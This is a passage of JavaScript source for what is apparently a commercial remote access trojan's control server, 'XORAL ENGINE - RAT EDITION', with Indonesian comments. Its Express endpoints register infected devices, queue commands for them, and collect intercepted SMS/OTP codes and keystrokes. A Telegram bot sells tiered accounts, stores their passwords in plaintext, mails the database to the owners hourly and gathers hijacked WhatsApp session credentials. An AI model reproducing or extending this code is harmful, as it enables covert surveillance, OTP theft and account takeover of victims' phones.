        caption: '📦 Database otomatis dikirim setiap 1 jam.',
        parse_mode: 'Markdown'
      });
      console.log(`[DB BACKUP] database.json berhasil dikirim ke owner ${ownerId}`);
    } catch (err) {
      console.error('[DB BACKUP] Gagal kirim database.json ke owner', ownerId, err.message);
    }
  }
}

function scheduleDatabaseBackupToOwners() {
  const interval = 60 * 60 * 1000;
  setTimeout(() => {
    sendDatabaseToOwners();
    setInterval(sendDatabaseToOwners, interval);
  }, interval);
}

function sendAccountDeletedNotification({ username, password, role, deletedBy, deletedAt }) {
  const text = `🗑️ *Akun berhasil di hapus*

` +
    `👤 Username: ${username}
` +
    `🔑 Password: ${password}
` +
    `🎯 Role: ${role}
` +
    `👤 Di hapus oleh: ${deletedBy}
` +
    `⏰ Waktu akun di hapus: ${deletedAt}`;

  sendTelegramOwners(text);
}

function sendDefaceNotification({ targetId, title, body, category, time }) {
  const text = `🔥 *Deface baru di RAT terdeteksi!*

` +
    `🆔 Target ID: ${targetId}
` +
    `📝 Judul: ${title || '-'}
` +
    `📌 Kategori: ${category || '-'}
` +
    `⏰ Time: ${time}
` +
    `
📩 Detail:
${body ? body.toString().slice(0, 250) : '-'} `;

  sendTelegramOwners(text);
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📋 LIST SENDER", callback_data: "list_sender" }],
        ...(isOwner ? [[
          { text: "🛠️ Buat Akun", callback_data: "create_account" }
        ], [
          { text: "� Tutup Sender Global", callback_data: "global_off" },
          { text: "🔓 Buka Sender Global", callback_data: "global_on" }
        ], [
          { text: "ℹ️ Status Sender Global", callback_data: "global_status" },
          { text: "📋 List User", callback_data: "list_user" }
        ], [
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (pendingAccountCreates[userId]) {
    const state = pendingAccountCreates[userId];
    if (state.step === 'awaiting_username') {
      state.username = msg.text?.trim();
      if (!state.username) {
        return bot.sendMessage(chatId, '⚠️ Username tidak boleh kosong. Masukkan username:');
      }
      state.step = 'awaiting_password';
      return bot.sendMessage(chatId, 'Masukkan password:');
    }

    if (state.step === 'awaiting_password') {
      const password = msg.text?.trim();
      if (!password) {
        return bot.sendMessage(chatId, '⚠️ Password tidak boleh kosong. Masukkan password:');
      }
      const db = loadDatabase();
      const existing = db.find(u => u.username === state.username);
      if (existing) {
        delete pendingAccountCreates[userId];
        return bot.sendMessage(chatId, `❌ Username ${state.username} sudah terdaftar. Proses dibatalkan.`);
      }

      const expired = new Date();
      expired.setDate(expired.getDate() + 30);
      const newUser = {
        username: state.username,
        password,
        role: state.role,
        expiredDate: expired.toISOString().split('T')[0]
      };
      db.push(newUser);
      saveDatabase(db);
      delete pendingAccountCreates[userId];

      return bot.sendMessage(chatId, `✅ Akun berhasil di buat\n\nusername: ${newUser.username}\npassword: ${newUser.password}\nrole: ${newUser.role}\nexp: ${newUser.expiredDate}\n\nselamat menggunakan apk bugs xora, semoga hari mu menyenangkan`, { parse_mode: 'Markdown' });
    }
  }

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
      try {
        const uploader = sanitize(msg.from.username || msg.from.first_name || String(chatId));
        const text = `PENAMBAHAN SENDER\nFILENAME: ${sanitize(finalName)}\nUPLOADER: ${uploader}`;
        sendTelegramOwners(text);
      } catch (e) {
        console.error('[❌ TELEGRAM NOTIF] Failed to notify owners about new sender:', e.message || e);
      }
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "global_off":
      if (!isOwner) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
      saveGlobalSenderState({ enabled: false, updatedAt: new Date().toISOString(), updatedBy: query.from.username || query.from.first_name || String(id) });
      bot.answerCallbackQuery(query.id, { text: "Sender global ditutup untuk semua user." });
      bot.sendMessage(id, "🔒 Sender global sekarang ditutup untuk semua user dan semua role.");
      break;

    case "global_on":
      if (!isOwner) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
      saveGlobalSenderState({ enabled: true, updatedAt: new Date().toISOString(), updatedBy: query.from.username || query.from.first_name || String(id) });
      bot.answerCallbackQuery(query.id, { text: "Sender global dibuka kembali." });
      bot.sendMessage(id, "✅ Sender global sekarang aktif kembali untuk semua user.");
      break;

    case "global_status":
      {
        const statusPayload = getGlobalSenderStatusPayload();
        const totalSender = Object.keys(activeConnections).length;
        const statusText = statusPayload.enabled ? 'aktif' : 'tutup';
        bot.sendMessage(id, `🛡️ Sender sedang ${statusText}.\n\nTotal sender: ${totalSender}\n\nKetik /globaloff untuk tutup atau /globalon untuk buka.`, { parse_mode: 'Markdown' });
      }
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "list_sender":
      if (!isOwner) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
      {
        const keyList = loadKeyList();
        const db = loadDatabase();
        const senders = Object.keys(activeConnections)
          .sort((a, b) => a.localeCompare(b, undefined, { numeric: true, sensitivity: 'base' }))
          .map((sender, index) => {
            const user = keyList.find(k => k.sessionKey === sender);
            const username = user?.username || "Unknown";
            const role = db.find(u => u.username === username)?.role || "member";
            return `${index + 1}. no ${sender}\nakun ${username}\nrole ${role}`;
          });

        const text = senders.length > 0
          ? `📋 *LIST SENDER (${senders.length})*\n\n${senders.join("\n\n")}`
          : "⚠️ Tidak ada sender aktif saat ini.";

        bot.sendMessage(id, text, { parse_mode: "Markdown" });
      }
      break;

    case "create_account":
      if (!isOwner) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
      bot.answerCallbackQuery(query.id, { text: "Pilih role untuk akun baru." });
      bot.sendMessage(id, "Pilih role:", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "member", callback_data: "create_account_role_member" }],
            [{ text: "reseller", callback_data: "create_account_role_reseller" }],
            [{ text: "vip", callback_data: "create_account_role_vip" }],
            [{ text: "pt", callback_data: "create_account_role_pt" }],
            [{ text: "owner", callback_data: "create_account_role_owner" }]
          ]
        }
      });
      break;

    case "create_account_role_member":
    case "create_account_role_reseller":
    case "create_account_role_vip":
    case "create_account_role_pt":
    case "create_account_role_owner":
      if (!isOwner) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
      {
        const role = data.replace('create_account_role_', '');
        pendingAccountCreates[id] = { step: 'awaiting_username', role };
        bot.answerCallbackQuery(query.id, { text: `Role dipilih: ${role}` });
        bot.sendMessage(id, 'Masukan username:');
      }
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        sendAccountDeletedNotification({
          username: deleted.username,
          password: deleted.password || 'N/A',
          role: deleted.role || 'member',
          deletedBy: msg.from.username || msg.from.first_name,
          deletedAt: new Date().toLocaleString('id-ID')
        });
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

bot.onText(/^\/?(globaloff|globalon)$/i, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Hanya owner yang bisa ubah status sender global.", { parse_mode: "Markdown" });
  }

  const isTurnOn = msg.text.toLowerCase().includes('globalon');
  const payload = saveGlobalSenderState({ enabled: isTurnOn, updatedAt: new Date().toISOString(), updatedBy: msg.from.username || msg.from.first_name || String(id) });

  const statusText = payload.enabled ? 'AKTIF' : 'DITUTUP';
  const detailText = payload.enabled
    ? '✅ Sender global sekarang aktif kembali untuk semua user.'
    : '🔒 Sender global sekarang ditutup untuk semua user dan semua role.';

  bot.sendMessage(chatId, `🛡️ [GLOBAL SENDER] *STATUS: ${statusText}*\n\n${detailText}\n\n⚠️ Ketik /globaloff untuk menutup atau /globalon untuk membuka kembali.`, { parse_mode: 'Markdown' });
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(() => {
    const targetChatId = "-1003841592375"; 
    bot.sendMessage(targetChatId, "✅ [SERVER] *SERVICES ONLINE*\n\nSystem Status: *RUNNING*\nUptime: Just started\n✅ All systems operational.", { parse_mode: "Markdown" });
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();

  // 00:00 WIB = 17:00 UTC
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  // kalau sudah lewat, jadwalkan besok
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();

    // ulangi setiap hari tepat jam yang sama
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

// ========== TAMBAHKAN INI DI ATAS APP.LISTEN ==========
app.use(cors()); 
app.use(bodyParser.json({ limit: '500mb' })); 

const TARGETS_FILE = './targets.json';
const NOTIF_FILE = './notifications.json';
const COMMANDS_FILE = './commands.json';
const RESPONSES_FILE = './responses.json';

const readData = (file) => {
    if (!fs.existsSync(file)) return [];
    try {
        const content = fs.readFileSync(file, 'utf8');
        return JSON.parse(content || '[]');
    } catch (e) { return []; }
};

const saveData = (file, data) => {
    try {
        fs.writeFileSync(file, JSON.stringify(data, null, 2));
    } catch (e) { console.log(`[!] Gagal simpan database: ${file}`, e); }
};

// ENDPOINT HEARTBEAT
app.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === targetId);

    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].status = "Online";
        saveData(TARGETS_FILE, targets);
    }
    
    res.status(200).send('1'); 
});

app.post('/api/register-target', (req, res) => {
    const deviceData = req.body;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === deviceData.id);

    if (index !== -1) {
        targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date() };
    } else {
        targets.push({ ...deviceData, lastSeen: new Date() });
    }
    saveData(TARGETS_FILE, targets);
    res.json({ status: 'ok' });
});

app.get('/api/list-targets', (req, res) => {
    const targets = readData(TARGETS_FILE);
    res.json(targets);
});

app.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    let allNotifs = readData(NOTIF_FILE);
    
    const category = String(req.body.category || '').toLowerCase();
    const title = String(req.body.title || '');
    const body = String(req.body.body || '');

    if (category === "otp/sms") {
        console.log(`[intercept] SMS CURIAN: ${req.body.title} -> ${req.body.body}`);
    }

    const isDeface = category.includes('deface') || title.toLowerCase().includes('deface') || body.toLowerCase().includes('deface');
    if (isDeface) {
      sendDefaceNotification({
        targetId,
        title,
        body,
        category: req.body.category || '-',
        time: new Date().toLocaleString('id-ID')
      });
    }

    allNotifs.unshift({ targetId, ...req.body, timestamp: new Date() });
    if (allNotifs.length > 500) allNotifs = allNotifs.slice(0, 500);
    saveData(NOTIF_FILE, allNotifs);
    console.log(`[NOTIF] Data masuk dari Target: ${targetId}`);
    res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
    const allNotifs = readData(NOTIF_FILE);
    const filtered = allNotifs.filter(n => n.targetId === req.params.id);
    res.json(filtered);
});

app.post('/api/send-command', (req, res) => {
    const { id, command, extra } = req.body;
    let commands = readData(COMMANDS_FILE);
    
    commands = commands.filter(c => c.targetId !== id);
    commands.push({ targetId: id, command, extra, timestamp: new Date() });
    
    saveData(COMMANDS_FILE, commands);
    console.log(`[CMD] Operator -> ${id}: ${command}`);
    res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
    const targetId = req.params.id;
    let commands = readData(COMMANDS_FILE);
    const cmdIndex = commands.findIndex(c => c.targetId === targetId);

    if (cmdIndex !== -1) {
        const cmd = commands[cmdIndex];
        commands.splice(cmdIndex, 1); 
        saveData(COMMANDS_FILE, commands);
        return res.json(cmd);
    }
    res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    const { cmd, data } = req.body;
    let responses = readData(RESPONSES_FILE);

    if(cmd === "lock_key_attempt" || cmd === "lock_input_log") {
        console.log(`[KEYLOG] Target ${targetId} mengetik: ${data.input || data.attempt}`);
    }

    const index = responses.findIndex(r => r.targetId === targetId);
    const newRes = { targetId, cmd, data, timestamp: new Date() };

    if (index !== -1) responses[index] = newRes;
    else responses.push(newRes);
    
    saveData(RESPONSES_FILE, responses);
    console.log(`[!] Respon ${cmd} diterima dari ${targetId}`);
    res.json({ status: 'received' });
});

app.get('/api/get-response/:id', (req, res) => {
    const responses = readData(RESPONSES_FILE);
    const resData = responses.find(r => r.targetId === req.params.id);
    res.json(resData || {});
});

app.post('/api/login', (req, res) => {
    console.log(`[LOGIN] Bypass attempt for user: ${req.body.username}`);
    res.json({ status: 'ok', message: 'Bypassed by Dark-Ai' });
});

console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
console.log(`    XORAL ENGINE - RAT EDITION   `);
console.log(`    STATUS : PERSISTENCE ACTIVE        `);
console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

// ===== START SERVER (HANYA SATU APP.LISTEN) =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
  startVipSessions();
  startUserSessions();

  console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
  setInterval(autoRefresh, THIRTY_MINUTES);
  console.log(`[AUTOBACKUP DB] database.json akan dikirim otomatis ke owner setiap 1 jam.`);
  scheduleDatabaseBackupToOwners();
  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
  scheduleAutoClean();
});